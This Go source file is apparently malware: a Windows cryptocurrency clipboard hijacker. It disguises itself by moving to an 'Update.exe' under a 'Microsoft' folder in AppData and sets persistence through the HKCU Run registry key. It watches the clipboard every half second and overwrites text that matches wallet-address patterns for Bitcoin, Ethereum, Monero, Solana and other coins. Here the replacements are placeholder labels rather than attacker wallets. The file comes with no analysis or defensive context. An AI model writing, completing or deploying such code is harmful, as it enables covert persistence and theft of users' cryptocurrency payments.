package main

import (
	"fmt"
	"os"
	"regexp"
	"time"

	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	dirName       = "Microsoft"
	fileName      = "Update"
	mutexName     = "Global\\qerhbfnuqeurtrbdtbqehvfrq"
	registryName  = "Update"
	clipboardFreq = 500 * time.Millisecond
)

var regexMap = map[*regexp.Regexp]string{
    regexp.MustCompile(`^[48][A-Za-z0-9]{94}$`):                           "XMR Address",
    regexp.MustCompile(`^L[a-zA-HJ-NP-Z0-9]{33}$`):                        "LTC Address",
    regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`):                     "Trx address",
    regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`):                             "eth address",
    regexp.MustCompile(`^r[0-9a-zA-Z]{24,34}$`):                           "Xrp address",
    regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`): "Doge address",
    regexp.MustCompile(`^(bitcoincash:)?[qp][a-z0-9]{41}$`):               "bch address",
    regexp.MustCompile(`(^|\W)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}($|\W)`):  "btc address",
    regexp.MustCompile(`^t1[1-9A-HJ-NP-Za-km-zA-Z0-9]{33}$`):              "Zcash Address",
    regexp.MustCompile(`^z[1-9A-HJ-NP-Za-km-zA-Z0-9]{33}$`):               "Zcash Address",
    regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`):                   "Solana Address",
    regexp.MustCompile(`^bnb1[a-z0-9]{38}$`):                              "BNB Address",
}


func main() {
	if !ensureSingleInstance() {
		fmt.Println("Another instance is already running.")
		return
	}

	installSelf()
	monitorClipboard()
}

func ensureSingleInstance() bool {
	mutex, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(mutexName))
	if err != nil || windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		return false
	}
	defer windows.CloseHandle(mutex)
	return true
}

func installSelf() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Unable to determine executable path:", err)
		return
	}

	dirPath := os.Getenv("APPDATA") + "\\" + dirName
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		if err := os.Mkdir(dirPath, os.ModePerm); err != nil {
			fmt.Println("Failed to create directory:", err)
			return
		}
	}

	filePath := dirPath + "\\" + fileName + ".exe"
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		if err := os.Rename(exePath, filePath); err != nil {
			fmt.Println("Failed to move executable:", err)
			return
		}
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		key.SetStringValue(registryName, filePath)
	}
}

func monitorClipboard() {
	var lastClipboardText string
	clipboardChan := make(chan string)

	go func() {
		for {
			clipboardText, err := clipboard.ReadAll()
			if err == nil && clipboardText != lastClipboardText {
				clipboardChan <- clipboardText
				lastClipboardText = clipboardText
			}
			time.Sleep(clipboardFreq)
		}
	}()

	for {
		select {
		case clipboardText := <-clipboardChan:
			processClipboardText(clipboardText)
		case <-time.After(5 * time.Minute): 
			fmt.Println("No activity detected, exiting.")
			return
		}
	}
}

func processClipboardText(text string) {
	for regex, replacement := range regexMap {
		if regex.MatchString(text) {
			newText := regex.ReplaceAllString(text, replacement)
			if err := clipboard.WriteAll(newText); err == nil {
				fmt.Println("Clipboard text replaced.")
			}
		}
	}
}
